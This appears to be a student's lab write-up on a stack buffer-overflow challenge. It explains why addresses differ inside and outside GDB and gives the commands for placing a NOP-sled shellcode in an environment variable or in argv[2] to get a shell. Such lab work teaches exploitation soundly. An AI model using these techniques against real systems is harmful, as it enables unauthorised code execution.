## Questions

- Can you create an exploit which works with, and without GDB?

I had a bit of trouble doing this lab as I did not get the same adresses as the ones in the instructions (not a huge problem, just had to figure out the right adress for me by myself) and I could not generate the core files with the 'ulimit -c unlimited' command.
Now why does gdb exploits not work outside of gdb? The answer is explained [here](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it). Basically environment variables and program arguments are placed before the beginning of the stack. Moreover, gdb runs with two extra environment variables (LINES and COLUMNS). These extra variables tend to change the adresses on the stack by a small offset.

Because I could not use the core files to try and run the code both in and out of gdb, I decide to use a small trick I got in Jon erikson's art of exploitation. I stored the shellcode in an environment variable and got it's adress with [this small code snippet](https://raw.githubusercontent.com/intere/hacking/master/booksrc/getenvaddr.c).

As I couldn't ctrl-c/ctrl-v in the web terminal, I used the following command to extract the shellcode and store it in a txt file:

    $ echo -ne $(grep -o '".*"' challenge11-exploit-skel.py | sed 's/"//g' | sed -n '1p') > shellcode.txt

I then stored this shellcode in an env variable which allows me to have a nice big NOP sled:

    $ export SHELLCODE=$(python -c 'print "\x90"*500)$(cat shellcode.txt)

And got the adress with my litte getenv.c program.

    $ gcc -o getenv getenv.c
    $ ./getenv SHELLCODE challenge11
    SHELLCODE will be at 0xffffd768

I wrote the 0xffffd750 adress in the python exploit to try and have eip land right in the middle of the NOP sled and have it work both in and out of gdb. This did not work. While running the challenge11 program in gdb I ran:

    gdb-peda$: shell ./getenv SHELLCODE challenge11
    SHELLCODE will be at 0xffffdde9

Ok... Very different adress there. Lets take a look at the offset:

     $ python
     >>> 0xffffdde9 - 0xffffd750
     1665

Let's set our Nop Sled to 2000 and try again! I tried the adress 0xffffd89a in the python exploit while knowing that the enviroment variable adress was 0xffffd19a while running out of gdb and 0xffffd807 while running in gdb. And it worked! My python exploit was slightly modified and I have left it in this folder for that reason.

- Can you create an exploit where the shellcode is stored in the variable password (argv[2])?

Yes, of course we can! It's a simple matter of finding the adress of the test variable in memory. Lets just make an exploit that runs in gdb and not be bothered with running it out of gdb.

We set our breakpoint in handleData just as before and run challenge 11 with the following arguments:

    gdb-peda$: run `python -c 'print "A"*76'` BBBB

After hitting the breakpoint we hit:

    gdb-peda$: x/4xw $ebp+0x8
    0xffffcef0:      0xffffd0f8    0xffffd145    0xffffcfc4    0x080486b1

We can easily see that the first two adresses point to the arguments handleData was called with (and the last is SIP)

    gdb-peda$: x/4xw 0xffffd145
    0xffffd145       0x42424242 ....

So we now have the adress of test. We just need to write it in the python exploit file. I did so but the program did not work. Why? Because program argument length also change the adresses on the stack. Hence I had to find the new adress of my shellcode in gdb. I got 0xffffd0ce for the same shellcode including a 100 byte length nop sled.

I then ran the program again with:

    gdb-peda$: run `python challenge11-exploit-test.py` `python -c 'print "\x90"*100'`$(cat shellcode.txt)
    #

And tadaaaa! Got a shell with shellcode in the second argument!
